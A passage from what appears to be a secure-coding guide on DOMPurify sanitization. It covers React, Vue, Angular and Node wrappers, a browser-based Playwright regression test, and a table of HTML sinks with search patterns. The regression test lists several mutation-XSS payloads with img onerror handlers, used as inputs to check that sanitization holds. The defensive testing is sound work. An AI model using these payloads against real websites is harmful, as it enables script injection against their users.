  useMemo(() => ({ __html: DOMPurify.sanitize(String(dirty ?? ''), SANITIZE_CONFIG) }), [dirty]);
```

**Vue:**
```typescript
export const vSanitizedHtml: Directive<HTMLElement, string> = {
  mounted(el, binding) { el.innerHTML = DOMPurify.sanitize(String(binding.value ?? ''), SANITIZE_CONFIG); },
  updated(el, binding) {
    if (binding.value !== binding.oldValue)
      el.innerHTML = DOMPurify.sanitize(String(binding.value ?? ''), SANITIZE_CONFIG);
  },
};
```

**Angular:**
```typescript
@Pipe({ name: 'sanitize', pure: true })
export class SanitizePipe implements PipeTransform {
  constructor(private domSanitizer: DomSanitizer) {}
  transform(value: string): SafeHtml {
    const clean = DOMPurify.sanitize(String(value ?? ''), SANITIZE_CONFIG);
    return this.domSanitizer.bypassSecurityTrustHtml(clean);
  }
}
```

**Server-side Node.js:**
```javascript
function serverSanitize(dirty) {
  const window = new JSDOM('').window; // per-request instance
  const DOMPurify = createDOMPurify(window);
  return DOMPurify.sanitize(String(dirty ?? ''), config);
}
// ALWAYS re-sanitize on client -- server sanitization alone is insufficient
```

---

## Browser-Based Regression Testing

```javascript
// Critical: test sanitize + re-parse + DOM inspection (not just string output)
test('mXSS payload does not execute', async ({ page }) => {
  const payloads = [
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=x>',
    '<math><mtext><table><mglyph><style><!--</style><img src onerror=x>',
    '<select><option><img src=x onerror="alert(1)"></option><selectedcontent></selectedcontent></select>',
    '<form><math><mtext></form><form><mglyph><textarea></math><img src onerror=x>',
  ];
  for (const payload of payloads) {
    const count = await page.evaluate((p) => {
      const sanitized = DOMPurify.sanitize(p);
      const el = document.createElement('div');
      el.innerHTML = sanitized; // triggers browser re-parse
      return el.querySelectorAll('script, [onerror], [onclick], [onload]').length;
    }, payload);
    expect(count).toBe(0);
  }
});
```

**Playwright matrix (required -- jsdom is insufficient for mXSS testing):**
```javascript
module.exports = {
  projects: [
    { name: 'chromium', use: { browserName: 'chromium' } },
    { name: 'firefox',  use: { browserName: 'firefox'  } },
    { name: 'webkit',   use: { browserName: 'webkit'   } },
  ],
};
```

---

## HTML Sink and Source Quick Reference

### HTML Sinks

| Sink | Framework | Search Pattern |
|------|-----------|---------------|
| `element.innerHTML = ...` | Vanilla JS | `\.innerHTML\s*=` |
| `element.outerHTML = ...` | Vanilla JS | `\.outerHTML\s*=` |
| `element.insertAdjacentHTML(...)` | Vanilla JS | `insertAdjacentHTML` |
| `document.write(...)` | Vanilla JS | `document\.write` |
| `dangerouslySetInnerHTML={{__html:...}}` | React | `dangerouslySetInnerHTML` |
| `v-html="..."` | Vue | `v-html` |
| `sanitizer.bypassSecurityTrustHtml(...)` | Angular | `bypassSecurityTrustHtml` |
| `{@html ...}` | Svelte | `{@html` |
| `$(...).html(...)` | jQuery | `\.html\(` |

### Source-to-Sink Verification Steps

1. Identify all HTML sinks via grep patterns
2. Trace data backward to source (URL params, API responses, localStorage, postMessage, clipboard)
3. Verify DOMPurify is called on EVERY code path (check try/catch, if/else, ternary branches)
4. Verify configuration is secure (no ALLOW_UNKNOWN_PROTOCOLS, USE_PROFILES enabled, FORBID set)
5. Verify NO post-sanitization transforms between DOMPurify and sink
6. Verify context matching (HTML body = default, SVG = USE_PROFILES, templates = SAFE_FOR_TEMPLATES)
7. Verify RETURN_DOM_FRAGMENT where possible
8. Run mXSS regression payloads in real browsers via Playwright (not jsdom)

